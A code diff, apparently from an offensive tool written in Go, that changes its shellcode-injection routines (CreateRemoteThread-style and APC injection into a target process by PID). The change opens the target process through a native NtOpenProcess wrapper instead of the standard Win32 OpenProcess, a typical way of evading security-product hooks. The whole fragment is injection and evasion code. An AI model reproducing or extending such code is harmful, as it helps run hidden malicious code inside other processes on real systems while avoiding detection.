@@ -38,9 +38,9 @@ func InjectShellcode(targetPID uint32, shellcode []byte, method string) error {
 }
 
 func injectCRT(pid uint32, shellcode []byte) error {
-	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
+	hProc, err := winsyscall.NtOpenProcess(pid, winsyscall.ProcessAllAccess)
 	if err != nil {
-		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
+		return fmt.Errorf("NtOpenProcess(%d): %w", pid, err)
 	}
 	defer windows.CloseHandle(hProc)
 
@@ -69,9 +69,9 @@ func injectCRT(pid uint32, shellcode []byte) error {
 }
 
 func injectAPC(pid uint32, shellcode []byte) error {
-	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
+	hProc, err := winsyscall.NtOpenProcess(pid, winsyscall.ProcessAllAccess)
 	if err != nil {
-		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
+		return fmt.Errorf("NtOpenProcess(%d): %w", pid, err)
 	}
 	defer windows.CloseHandle(hProc)
 
